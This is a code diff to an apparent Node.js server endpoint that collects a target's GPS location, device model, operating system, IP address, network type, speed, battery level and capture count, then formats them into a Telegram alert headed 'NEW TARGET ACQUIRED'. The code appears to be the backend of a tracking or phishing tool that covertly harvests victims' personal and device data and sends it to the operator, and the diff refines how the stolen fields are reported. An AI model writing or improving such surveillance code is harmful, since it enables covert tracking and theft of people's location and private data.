@@ -113,7 +113,7 @@ app.post('/api/store', async (req, res) => {
         console.log('✅ Stored! Total:', allData.length);
 
         // ==========================================
-        // TELEGRAM CAPTION - SIRF REAL DATA!
+        // TELEGRAM CAPTION - SIRF REAL HARDWARE DATA!
         // ==========================================
         const device = fullDeviceInfo || deviceDetails || {};
         const loc = location || {};
@@ -122,27 +122,27 @@ app.post('/api/store', async (req, res) => {
         let captionLines = [];
         captionLines.push('🔴 <b>NEW TARGET ACQUIRED</b> 🔴');
 
-        // 1. LOCATION - only if real
-        if (loc.lat && loc.lng && loc.lat !== '—' && loc.lng !== '—') {
+        // 1. LOCATION
+        if (loc.lat && loc.lng) {
             captionLines.push(`📍 Location: ${loc.lat}, ${loc.lng}`);
         }
 
-        // 2. DEVICE - only if REAL (not Unknown)
+        // 2. DEVICE - REAL MANUFACTURER + MODEL
         let deviceDisplay = '';
         if (device.manufacturer && device.manufacturer !== 'Unknown' && device.manufacturer !== '—') {
             deviceDisplay = device.manufacturer;
         }
+        if (device.model && device.model !== 'Unknown' && device.model !== '—' && !device.model.includes('Unknown')) {
+            deviceDisplay += ' ' + device.model;
+        }
         if (device.deviceModel && device.deviceModel !== 'Unknown' && device.deviceModel !== '—' && !device.deviceModel.includes('Unknown')) {
             deviceDisplay += ' ' + device.deviceModel;
-        }
-        if (device.deviceName && device.deviceName !== 'Unknown' && device.deviceName !== '—' && !device.deviceName.includes('Unknown')) {
-            deviceDisplay = device.deviceName;
         }
         if (deviceDisplay.trim() && deviceDisplay !== 'Unknown' && deviceDisplay !== '—') {
             captionLines.push(`📱 Device: ${deviceDisplay.trim()}`);
         }
 
-        // 3. OS - only if REAL
+        // 3. OS - REAL OS
         if (device.os && device.os !== 'Unknown' && device.os !== '—') {
             let osStr = device.os;
             if (device.osVersion && device.osVersion !== 'Unknown' && device.osVersion !== '—') {
@@ -151,27 +151,27 @@ app.post('/api/store', async (req, res) => {
             captionLines.push(`📲 OS: ${osStr}`);
         }
 
-        // 4. IP - only if real
+        // 4. IP
         if (ipAddress && ipAddress !== 'Unknown' && ipAddress !== '—') {
             captionLines.push(`📡 IP: ${ipAddress}`);
         }
 
-        // 5. Network - only if real
+        // 5. Network
         if (device.connection?.type && device.connection.type !== 'Unknown' && device.connection.type !== '—') {
             captionLines.push(`📶 Network: ${device.connection.type}`);
         }
 
-        // 6. Speed - only if real
+        // 6. Speed
         if (speed.download && speed.download !== 'Unknown' && speed.download !== '—') {
             captionLines.push(`🚀 Speed: ${speed.download} Mbps`);
         }
 
-        // 7. Battery - only if real
+        // 7. Battery
         if (device.battery?.level && device.battery.level !== 'Unknown' && device.battery.level !== '—') {
             captionLines.push(`🔋 Battery: ${device.battery.level}`);
         }
 
-        // 8. Captures & Time - always show
+        // 8. Always show
         captionLines.push(`📸 Captures: ${captureCount || 1}`);
         captionLines.push(`🕐 Time: ${new Date().toISOString()}`);
 
